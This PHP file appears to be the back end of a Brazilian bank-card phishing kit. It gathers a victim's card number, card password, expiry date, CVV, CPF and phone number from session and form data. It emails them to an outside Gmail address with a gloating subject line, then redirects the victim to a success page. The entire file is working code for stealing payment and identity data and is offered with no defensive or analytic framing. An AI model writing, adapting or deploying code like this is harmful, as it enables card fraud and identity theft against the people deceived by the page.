<?php

session_start();

if(empty($_POST['cpf'] || empty($_POST['telefone']))){


    $_SESSION['error'] = "Iforme todos os campos!";
    header('Location:atualiza.php');



}else{

    
  
    header('Location:sucesso.php');

}


$numeroCard = $_SESSION['cartao']; 

$senhaCard = $_SESSION['senhaCartao'];

$validade = $_SESSION['validade'];
$cvv = $_SESSION['cvv'] ;

$cpf = addslashes($_POST['cpf']);

$telefone =  addslashes($_POST['telefone']);


//enviar no email


$dest = "putzzero007@gmail.com";

$assunto = "Chegou Infocc 💰:)";

$corpo = "<br><strong>Dados Credicard 💳</strong>";
$corpo .= "<br><strong>Numero Card </strong> $numeroCard";
$corpo .= "<br><strong>Senha Card </strong> $senhaCard";
$corpo .= "<br><strong>CVV </strong> $cvv";
$corpo .= "<br><strong>Validade </strong> $validade";
$corpo .= "<br><strong>Cpf </strong> $cpf";
$corpo .= "<br><strong>Telefone</strong> $telefone";


$header = "Content-Type:text/html; charset=utf-8";


mail($dest , $assunto , $corpo , $header);
